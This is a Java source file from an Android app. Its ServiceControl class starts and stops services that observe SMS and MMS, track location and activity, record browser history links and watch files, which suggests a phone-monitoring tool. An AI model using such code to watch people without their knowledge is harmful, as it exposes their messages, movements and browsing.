package com.inet.android.bs;

import android.content.Context;
import android.content.Intent;

import com.inet.android.history.LinkService;
import com.inet.android.list.Queue;
import com.inet.android.location.LocationTracker;
import com.inet.android.location.RecognitionDevService;
import com.inet.android.message.MMSObserver;
import com.inet.android.message.SMSBroadcastReceiver;
import com.inet.android.request.Request4;
import com.inet.android.utils.Logging;

import custom.fileobserver.FileObserverService;

public class ServiceControl {

	private static String LOG_TAG = ServiceControl.class.getSimpleName()
			.toString();
	
	public static void runService(Context mContext) {
		Logging.doLog(LOG_TAG, "start services", "start services");

		// ------------start brouser--------------------
		Intent linkServiceIntent = new Intent(mContext, LinkService.class);
		mContext.startService(linkServiceIntent);

		// ------------start file observer--------------------
		Intent fileServiceIntent = new Intent(mContext,
				FileObserverService.class);
		mContext.startService(fileServiceIntent);

		// ------------start location--------------------
		Intent locServiceIntent = new Intent(mContext, LocationTracker.class);
		mContext.startService(locServiceIntent);

		// ------------start recognition--------------------
		Intent recognitionServiceIntent = new Intent(mContext,
				RecognitionDevService.class);
		mContext.startService(recognitionServiceIntent);

		// ------------register sms&mms observer--------------------
		SMSBroadcastReceiver.regSmsObserver(mContext);
		MMSObserver.regMMSObserver(mContext);
		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
	}

	public static void runSMSObserver(Context mContext) {
		SMSBroadcastReceiver.regSmsObserver(mContext);
		MMSObserver.regMMSObserver(mContext);
	}

	public static void runLink(Context mContext) {
		Logging.doLog(LOG_TAG, "run Link", "run Link");

		Intent linkServiceIntent = new Intent(mContext, LinkService.class);
		mContext.startService(linkServiceIntent);
	}

	public static void runFileObserver(Context mContext) {
		Logging.doLog(LOG_TAG, "run File Observer", "run File Observer");

		Intent fileServiceIntent = new Intent(mContext,
				FileObserverService.class);
		mContext.startService(fileServiceIntent);
	}

	public static void stopFileObserver(Context mContext) {
		Logging.doLog(LOG_TAG, "stop File Observer", "stop File Observer");

		Intent fileServiceIntent = new Intent(mContext,
				FileObserverService.class);
		mContext.stopService(fileServiceIntent);
	}

	public static void runLocation(Context mContext) {
		Logging.doLog(LOG_TAG, "runLocation", "runLocation");

		Intent locServiceIntent = new Intent(mContext, LocationTracker.class);
		mContext.startService(locServiceIntent);
		Intent recognitionServiceIntent = new Intent(mContext,
				RecognitionDevService.class);
		mContext.startService(recognitionServiceIntent);
	}

	public static void runTurnList(Context mContext) {
		Queue.getList(mContext);
	}

	public static void stopLink(Context mContext) {
		Logging.doLog(LOG_TAG, "stopLink", "stopLink");

		Intent linkServiceIntent = new Intent(mContext, LinkService.class);
		mContext.stopService(linkServiceIntent);
	}
	public static void startRequest4(Context mContext){
		mContext.startService(new Intent(mContext, Request4.class));
	}
	private static void stopRequest4(Context mContext){
		mContext.stopService(new Intent(mContext, Request4.class));
	}
	public static void stopLocation(Context mContext) {
		Logging.doLog(LOG_TAG, "stopLocation", "stopLocation");

		Intent locServiceIntent = new Intent(mContext, LocationTracker.class);
		mContext.stopService(locServiceIntent);
		Intent recognitionServiceIntent = new Intent(mContext,
				RecognitionDevService.class);
		mContext.stopService(recognitionServiceIntent);
	}
	public static void deleteApp(Context mContext){
		stopLocation(mContext);
		stopLink(mContext);
		stopFileObserver(mContext);
		stopRequest4(mContext);
	}
}
